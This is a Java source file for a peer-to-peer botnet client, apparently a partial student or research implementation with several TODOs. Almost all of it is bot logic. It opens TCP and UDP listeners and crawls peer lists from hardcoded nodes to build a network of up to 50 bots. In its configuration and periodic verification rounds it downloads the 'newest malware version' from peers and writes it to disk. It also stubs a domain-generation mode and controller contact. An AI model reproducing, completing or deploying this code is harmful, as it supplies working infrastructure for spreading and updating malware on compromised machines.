import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Map;
import java.util.Queue;
import java.util.Set;
import java.util.concurrent.TimeUnit;

public class Botnet {
	protected HashMap<Integer, Peer> proxiesTable = new HashMap<Integer, Peer>();
	protected HashMap<Integer, Peer> peersTable = new HashMap<Integer, Peer>();
	protected Peer myPeerInfo = null;

	public String nextAction = null;
	protected XMLHandler handle = null;
	protected LogWriter log = null;
	protected boolean isConfigured = false;

	public Botnet() {
		log = new LogWriter();
		if (!initializeBot()) {
			log.addLogEntry("An erro occurred on bot iniatialization, and it was terminaded");
			System.exit(1);
		} else {
			log.addLogEntry("Bot iniatialization fully completed");
		}
	}

	public Botnet(String aux) {
		log = new LogWriter(aux);
		if (!initializeBot(aux)) {
			log.addLogEntry("An erro occurred on bot iniatialization, and it was terminaded");
			System.exit(1);
		} else {
			log.addLogEntry("Bot iniatialization fully completed");
		}
	}

	private boolean initializeBot(String aux) {
		handle = new XMLHandler(log, aux);
		myPeerInfo = handle.getMyPeerInfo();
		peersTable = handle.getHardcodedPeerList();
		proxiesTable = handle.getHardcodedProxyPeerList();
		if (handle == null || myPeerInfo == null || peersTable == null
				|| proxiesTable == null) {
			log.addLogEntry("Boolean values if they are working" + "Handle: "
					+ String.valueOf(handle == null) + "MyPeer: "
					+ String.valueOf(myPeerInfo == null) + "peersTable: "
					+ String.valueOf(peersTable == null) + "proxiesTable"
					+ String.valueOf(proxiesTable == null));
			return false;
		}
		return true;
	}

	/*
	 * 
	 */
	private boolean initializeBot() {
		handle = new XMLHandler(log);
		myPeerInfo = handle.getMyPeerInfo();
		peersTable = handle.getHardcodedPeerList();
		proxiesTable = handle.getHardcodedProxyPeerList();
		if (handle == null || myPeerInfo == null || peersTable == null
				|| proxiesTable == null) {
			log.addLogEntry("Boolean values if they are working" + "Handle: "
					+ String.valueOf(handle == null) + "MyPeer: "
					+ String.valueOf(myPeerInfo == null) + "peersTable: "
					+ String.valueOf(peersTable == null) + "proxiesTable"
					+ String.valueOf(proxiesTable == null));
			return false;
		}
		return true;
	}

	/*
	 * open tcp and udp connections
	 */
	public boolean openConnection() {
		int port = myPeerInfo.port;
		// open doors to other peers connect

		TCPServer tcpServer = new TCPServer(port, handle);
		tcpServer.start();
		UDPServer s = new UDPServer(port, handle);
		s.start();
		return true;
	}

	/*
	 * Generating domains TODO: not implemented yet
	 */
	public void DGAMode() {
		nextAction = "timer";
		return;
	}

	/*
	 * get peer lists from neighbours for all hardcoded(or neighbors) nodes,
	 * stops if we have 50 bots
	 */
	public boolean updatePeerList() {

		Queue<Peer> queue = new LinkedList<Peer>();
		Set<Integer> visitedId = new HashSet<Integer>();

		// check conncectivity with peersTable peers
		Iterator<Map.Entry<Integer, Peer>> it = peersTable.entrySet()
				.iterator();

		while (it.hasNext()) {
			Map.Entry<Integer, Peer> entry = it.next();
			Peer peer = entry.getValue();
			int id = entry.getKey();
			visitedId.add(id);

			if (peer.getVersion() != -1) {
				queue.add(peer);
			} else {
				System.out.println("removing"+id+"!");
				it.remove();
			}
		}

		// check conncectivity with hardcoded peers
		for (Map.Entry<Integer, Peer> entry : handle.getHardcodedPeerList()
				.entrySet()) {
			Peer peer = entry.getValue();
			int id = entry.getKey();

			if (visitedId.add(id) && id!= handle.getMyId()) {
				if (peer.getVersion() != -1) {
					queue.add(peer);
					peersTable.put(id, peer);
				}
			}
		}
		// get peers from peerlists of peers
		while (!queue.isEmpty()) {
			
			Peer peerAux = queue.remove();
			System.out.println("queue"+peerAux.host+" "+peerAux.port);

			HashMap<Integer, Peer> list = peerAux.getPeerList();

			if (list == null)
				continue;

			for (Map.Entry<Integer, Peer> entry : list.entrySet()) {
				Integer id = entry.getKey();
				Peer peer = entry.getValue();
				if (visitedId.add(id) && id!= handle.getMyId()) {
					if (peer.getVersion() != -1) {
						queue.add(peer);
						peersTable.put(id, peer);
					}
				}
				if (peersTable.size() == 50)
					break;
			}
		}

		if (peersTable.size() < 1) {
			nextAction = "DGAMode";
			return true;
		}
		// save list to file
		String content = "<peerlist>\n";
		for (Map.Entry<Integer, Peer> entry : peersTable.entrySet()) {
			Integer id = entry.getKey();
			Peer peer = entry.getValue();
			content += "<connection id=\"" + id + "\">\n" + "<port>"
					+ peer.port + "</port>\n" + "<host>" + peer.host
					+ "</host>\n" + "</connection>\n";
		}
		content += "</peerlist>";
		handle.writePeerList(content);
		nextAction = "configuration";
		return true;
	}

	/*
	 * On the configuration Phase we have to do some 1-time activities in order
	 * to work properly. For this, the bot must download the newest malware
	 * version among all its peer Neighbours. When the download it is complete,
	 * the bot get info from it, e.g Server List, DGA alghoritms, temps
	 */
	public void configuration() {
		if (!isConfigured) {
			Peer mostUpdatedPeer = getMostUpdatedPeer();
			if (mostUpdatedPeer != null) {
				ByteArrayOutputStream baos;
				baos = (ByteArrayOutputStream) mostUpdatedPeer.getFile();
				handle.writeMalwareFile(baos);
			}
			// TODO post to Controller Command
			// TODO configure using info obtained from peer
		}
		nextAction = "timer";
		return;
	}

	/*
	 * On this method we check the connection of every peer bot that belong to
	 * the peer list, finding the peer with the newest version of the bot. if
	 * peer not reply, try to connect again 5 times. If the peer can not be
	 * reach, and this bot it is connected to the Internet then the peer must be
	 * removed
	 */
	public Peer getMostUpdatedPeer() {
		int newestVersion = handle.getVersion();
		Peer mostUpdatedPeer = null;
		for (Map.Entry<Integer, Peer> entry : peersTable.entrySet()) {
			Integer id = entry.getKey();
			Peer peer = entry.getValue();
			int peerVersion = peer.getVersion();
			boolean isPeerReachable = false;

			if (peerVersion == -1) {// not reachable
				for (int i = 1; i <= 5; i++) {
					peerVersion = peer.getVersion();
					if (peerVersion != -1) {
						isPeerReachable = true;
						break;
					}
				}
				if (!isPeerReachable) {
					if (isInternetReachable()) {
						peersTable.remove(id);
						continue;
					} else {
						mostUpdatedPeer = null;
						break;
					}
				}

			} else {
				if (newestVersion < peerVersion) {
					mostUpdatedPeer = peer;
					newestVersion = peerVersion;
				}
			}
		}
		return mostUpdatedPeer;
	}

	public boolean isInternetReachable() {
		try {
			// make a URL to a known source
			URL url = new URL("http://www.google.com");

			// open a connection to that source
			HttpURLConnection urlConnect = (HttpURLConnection) url
					.openConnection();

			// trying to retrieve data from the source. If there
			// is no connection, this line will fail
			urlConnect.getContent();

		} catch (UnknownHostException e) {
			e.printStackTrace();
			return false;
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}

	public boolean timer() {
		try {
			TimeUnit.MINUTES.sleep(1);// TODO:change to 30 minutes
		} catch (InterruptedException ex) {
			log.addLogEntry("error" + ex);
			System.exit(1);
		}
		if (peersTable.size() < 2) {
			nextAction = "updatePeerList";
		} else {
			nextAction = "verificationRound";
		}
		return true;
	}

	public boolean verificationRound() {
		Peer mostUpdatedPeer = getMostUpdatedPeer();
		if (mostUpdatedPeer != null) {
			ByteArrayOutputStream baos;
			baos = (ByteArrayOutputStream) mostUpdatedPeer.getFile();
			handle.writeMalwareFile(baos);
		}
		nextAction = "timer";
		return true;
	}

}